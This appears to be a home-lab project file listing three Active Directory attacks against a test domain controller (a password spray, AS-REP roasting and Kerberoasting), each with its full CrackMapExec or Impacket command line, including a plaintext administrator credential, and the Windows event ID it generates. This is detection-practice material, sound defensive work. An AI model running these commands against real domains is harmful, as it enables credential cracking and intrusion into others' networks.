# Attack Commands — Project 8

## Attack 1 — Password Spray
Tool: CrackMapExec / Impacket
Target: jsmith

Command used from Kali:
crackmapexec smb 192.168.56.10 -u users.txt -p passwords.txt

Event Generated: 4625 (Failed Logon)

---

## Attack 2 — AS-REP Roasting
Tool: Impacket GetNPUsers.py
Target: sconnor (DoesNotRequirePreAuth = True)

Command used from Kali:
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py corp.local/sconnor -no-pass -dc-ip 192.168.56.10

Event Generated: 4768 (Kerberos TGT Request, RC4 0x17)

---

## Attack 3 — Kerberoasting
Tool: Impacket GetUserSPNs.py
Target: sqlsvc (SPN: MSSQLSvc/DC01.corp.local:1433)

Command used from Kali:
python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py corp.local/Administrator:pass@123 -dc-ip 192.168.56.10 -request

Event Generated: 4769 (Kerberos Service Ticket Request, RC4 0x17)